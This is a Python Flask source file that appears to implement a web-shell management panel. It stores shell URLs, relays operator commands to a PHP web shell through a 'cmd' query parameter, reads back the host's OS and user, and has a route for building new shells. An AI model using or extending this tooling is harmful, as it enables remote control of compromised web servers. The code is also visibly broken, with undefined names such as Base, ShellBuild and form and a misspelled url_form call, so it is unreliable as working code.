from application import app, db
from flask import Flask, request, flash, url_for, redirect, \
     render_template, abort, g, jsonify, current_app
import requests
from .forms import LoginForm, NewShell

errors = []

@app.route('/', methods = ['GET'])
def index():
  base = ''
  try:
      base = Base.query.all()
  except:
        errors.append("Error getting index")
  return render_template('index.html', base=base)

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        flash('Login requested for OpenID= remember_me=%s' %
              (str(form.remember_me.data)))
        return redirect('/index')
    return render_template('login.html',
                           title='Sign In',
                           form=form)

@app.route('/shell', methods = ['GET'])
def shells():
    base =''
    base = Base.query.all()

    return render_template('shell.html', id=id, base=base)

@app.route('/shell/new', methods = ['GET','POST'])
def new_shell():
    new = NewShell()
    if new.validate_on_submit():

        base = Base(shell_url = form.shell_url.data,
            shell_type = form.shell_type.data)

        db.session.add(base)

    try:
        db.session.commit()
        return redirect(url_for('index'), form=form)
    except:
        print("Could not save new shell!")
    else:
        return render_template('new_shell.html', form=form)

    return redirect(url_form(shell))

@app.route('/shell/<int:id>', methods = ['GET','POST'])
def shell(id):
    base = ''
    output = ''
    cmd = ''
    os = ''

    id = Base.query.filter_by(id=id).first()
    base = Base.query.all()

    if request.method == 'POST':
        cmd = request.form['cmd']
    try:
        shell_url = 'http://localhost:8000/php_shell.php'
        shell_function = '?cmd='
        shell_os = '?OS'
        shell_user = '?ID'
        os_get = requests.get(shell_url+shell_os)
        user_get = requests.get(shell_url+shell_user)
        if cmd != '':
          r = requests.get(shell_url+shell_function+cmd)
    except:
        errors.append("Error getting shell")
        return render_template('shell.html', errors=errors)
    if cmd != '':
      if r:
        output = r.text
    os = os_get.text
    user = user_get.text
    return render_template('shell.html', output=output, cmd=cmd, id=id, base=base, os=os, user=user)

@app.route('/build', methods = ['GET','POST'])
def build():
    filename = ''
    function = ''
    shell_type = ''
    try:
        if request.method == 'POST':
            filename = request.form['filename']
            function = request.form['function']
            shell_type = request.form['shell_type']
            ShellBuild(filename, shell_type, function)
            return redirect('/')
    except:
        errors.append("Error getting shell")
        return render_template('build.html', errors=errors)
    return render_template('build.html', filename=filename, function=function, shell_type=shell_type)
